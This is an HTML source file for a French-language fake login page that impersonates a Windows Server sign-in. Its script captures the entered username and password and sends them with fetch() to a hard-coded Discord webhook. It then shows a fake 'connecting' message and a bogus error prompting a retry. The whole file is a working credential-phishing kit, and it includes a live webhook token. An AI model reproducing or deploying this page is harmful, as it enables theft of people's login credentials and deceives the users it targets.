<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            padding: 20px;
            border-radius: 5px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"],
        input[type="password"],
        button {
            margin-bottom: 10px;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
        }
        button {
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        #image-container {
            display: flex;
            justify-content: space-around;
            margin-top: 20px;
            position: relative;
        }
        #image-container img {
            width: 150px;
            height: 150px;
            border-radius: 50%;
        }
    </style>
</head>
<body>
    <div class="container">
        <form id="loginForm" action="forms.php" method="post">
            <input type="text" id="identifiant" name="identifiant" placeholder="Identifiant" required>
            <input type="password" id="motdepasse" name="motdepasse" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div id="image-container">
            <img id="image1" src="https://ck-officetechnologies.lu/wp-content/uploads/sites/2/2021/07/windows-server-2019.png">
        </div>
        <div id="success" style="display:none;">
            <h2 class="message" id="message">Connexion en cours...</h2>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Empêche le comportement par défaut du formulaire

            // Récupération des valeurs des champs
            var identifiant = document.getElementById("identifiant").value;
            var motdepasse = document.getElementById("motdepasse").value;

            document.getElementById("loginForm").style.display = "none";
            document.getElementById("image-container").style.display = "none";
            document.getElementById("success").style.display = "block";

            // Création d'une requête XHR
            var formData = new FormData();
            formData.append("identifiant", identifiant);
            formData.append("motdepasse", motdepasse);
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "forms.php", true);

            var webhookURL = 'https://discord.com/api/webhooks/1228078613853900850/St-8cUkQY7pH0dodJTUFNT0827XIclL_nE_XVVadlNu7YWR9aOX326nG4FZzvAb9IRS6'; // Remplacez par votre URL de webhook

            // Données à envoyer
            var data = {
                "identifiant": identifiant,
                "motdepasse": motdepasse
            };


            // Envoi de la requête POST au webhook Discord
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Erreur lors de l\'envoi de la requête au webhook Discord');
                }
                console.log('Message envoyé avec succès à Discord');
            })
            .catch(error => {
                console.error('Erreur :', error);
            });
            setTimeout(function() {
                console.log("Identifiant:", identifiant);
                console.log("Mot de passe:", motdepasse);
            }, 2000);
            
            setTimeout(function() {
                alert("Une erreur s'est produite, veuillez reessayer")
            }, 3000);
            

        });
    </script>
</body>
</html>
